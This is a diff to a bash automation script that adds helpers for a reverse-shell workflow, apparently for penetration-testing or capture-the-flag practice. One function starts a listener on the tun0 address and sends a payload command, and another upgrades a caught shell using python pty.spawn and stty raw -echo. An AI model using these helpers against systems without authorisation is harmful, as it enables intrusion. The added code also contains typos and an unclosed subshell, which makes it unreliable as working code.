@@ -206,3 +206,24 @@ function alt_tab(){
 	xte "keydown Alt_L" "keydown Tab" "keyup Alt_L" "keyup Tab"
 	sleep 0.5
 }
+
+funtion reverse(){
+	IP=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+	PORT=$(($RANDOM+3000))
+	hide_guake
+	teminator
+	sleep 0.5
+	command "ncl $PORT"
+	alt_tab
+	COMMAND=$1
+	command "$COMMAND"
+}
+
+function stabilize(){
+	hide_guake
+	command "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+	ctrl Z
+	command "stty raw -echo"
+	command "fg"
+	command "export TERM=xterm"
+}
